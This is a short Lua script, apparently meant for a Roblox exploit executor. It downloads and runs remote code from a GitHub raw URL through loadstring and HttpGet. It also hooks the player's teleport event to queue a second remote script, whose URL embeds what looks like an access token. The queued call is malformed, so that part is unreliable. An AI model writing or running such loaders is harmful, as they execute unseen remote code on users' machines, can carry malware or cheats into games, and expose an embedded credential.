repeat
    task.wait()
until game:IsLoaded()
loadstring(
    game:HttpGet(
        'https://raw.githubusercontent.com/Verteniasty/Pet-rbx/refs/heads/main/loadstring'
    )
)()

local QueueOnTeleport = queue_on_teleport
    or queueonteleport
    or (syn and syn.queue_on_teleport)

local Players = game:GetService('Players')
repeat
    task.wait()
until Players.LocalPlayer
local LocalPlayer = Players.LocalPlayer

LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.InProgress then
        QueueOnTeleport(
            "https://raw.githubusercontent.com/ThemPrices/meat/refs/heads/main/lapppp.lua?token=GHSAT0AAAAAADBNCHW5ZVOZ62ZYGC3P2NL2Z7KJMFA')()"
        )
    end
end)
